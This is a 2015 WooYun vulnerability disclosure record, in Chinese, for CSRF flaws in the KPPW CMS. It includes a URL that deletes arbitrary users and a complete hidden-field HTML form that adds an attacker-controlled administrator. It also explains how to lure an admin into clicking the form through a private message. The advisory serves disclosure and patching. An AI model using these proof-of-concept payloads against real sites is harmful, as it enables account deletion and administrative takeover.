{"id": 39909, "wybug_id": "wooyun-2015-092952", "wybug_title": "KPPW最新版本(Csrf删除任意帐号/添加管理员)", "wybug_corp": "keke.com", "wybug_author": "浅蓝", "wybug_date": "2015-01-26 11:03", "wybug_open_date": "2015-04-26 11:04", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向公众公开  简要描述： 求高Rank 么么哒~ 详细说明：  http://localhost/KPPW/index.php?do=user&view=message&op=sendhttp://localhost/KPPW/index.php?do=pubtask&id=1&step=step2收件人填目标用户名标题随便内容没有转义 不过过滤了敏感标签和 onerror onload等事件。先来看第一个删除任意帐号http://localhost/KPPW/admin/index.php?do=user&view=list&op=del&edituid=5529GET提交此URL 就会删除ID为 “5529”的用户接着是添加管理员在添加用户处抓包提交数据为\nedituid=&fds[username]=qianlan&fds[truename]=&fds[phone]=&fds[qq]=&fds[indus_pid]=&fds[indus_id]=&fds[birthday]=&fds[password]=111111&fds[email]=x@q.c&fds[group_id]=1&is_submit=1\n现在来构造一个表单\n<form action=\"http://localhost/KPPW/admin/index.php?do=user&view=add&edituid=\" method=\"post\">\t<input type=hidden name=\"edituid\" value=\"\">\t<input type=hidden name=\"fds[username]\" value=\"qianlan\">\t<input type=hidden name=\"fds[truename]\" value=\"\">\t<input type=hidden name=\"fds[phone]\" value=\"\">\t<input type=hidden name=\"fds[qq]\" value=\"\">\t<input type=hidden name=\"fds[indus_pid]\" value=\"\">\t<input type=hidden name=\"fds[indus_id]\" value=\"\">\t<input type=hidden name=\"fds[birthday]\" value=\"\">\t<input type=hidden name=\"fds[password]\" value=\"123456\">\t<input type=hidden name=\"fds[email]\" value=\"x@q.c\">\t<input type=hidden name=\"fds[group_id]\" value=\"1\">\t<input type=\"submit\" name=\"is_submit\" value=\"1\"></form>\n其他比较敏感的都隐藏起来。 因为script 标签被过滤。 不能自动提交。所以放出来个按钮，发给人家一看  一个按钮  是谁都会有好奇心  肯定会点下这个按钮。将此发给管理员。  就坐等添加新帐号吧，或者可以不用写表单， 嵌入其他URL， 还可以自动提交。   此处自由发挥现在来用小号给管理员发个私信\n\n\n\n现在来看看效果  ，  出来一个小按钮  接着点击。我们现在来后台的会员管理看看是否添加了一个名为qianlan的管理员\n\n添加成功，用户组为管理员帐号qianlan  密码 123456   漏洞证明：  \n\n   修复方案：  用PHP的html转义函数对数据进行过滤   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-01-26 17:10 厂商回复： 谢谢提交bug 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-26 11:08 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  啥时候提交的，审核了几天？    \n     2015-01-27 09:21 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  @浅蓝 啥时候提交的  我20号提交的cms到现在都没审核    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}